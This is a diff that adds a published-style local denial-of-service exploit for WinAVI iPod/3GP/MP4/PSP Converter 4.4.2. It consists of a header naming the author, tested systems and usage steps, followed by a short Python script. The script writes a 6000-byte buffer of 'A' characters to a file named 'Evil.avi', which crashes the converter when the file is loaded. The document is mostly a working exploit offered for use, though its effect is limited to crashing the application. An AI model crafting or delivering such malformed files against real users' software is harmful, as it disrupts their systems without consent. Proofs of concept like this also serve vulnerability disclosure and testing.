@@ -1,0 +1,28 @@
+# Exploit Title: WinAVI iPod/3GP/MP4/PSP Converter 4.4.2 Local Dos Exploit
+# Date: 16.03.2019
+# Vendor Homepage:http://www.winavi.com
+# Software Link:  http://www.winavi.com/user/download/WinAVI_iPod_3GP_MP4_PSP_Converter.exe
+# Exploit Author: Achilles
+# Tested Version: 4.4.2
+# Tested on: Windows XP SP3 EN
+#            Windows 7 x64 Sp1
+
+
+# 1.- Run the python script, it will create a new file with the name "Evil.avi"
+# 2.- Open WinAVI.exe and Click 'Convert to iPhone'
+# 3.- Load the file "Evil.avi"
+# 4.- And you will see a crash.
+
+
+
+#!/usr/bin/env python
+buffer = "\x41" * 6000
+
+try:
+	f=open("Evil.avi","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
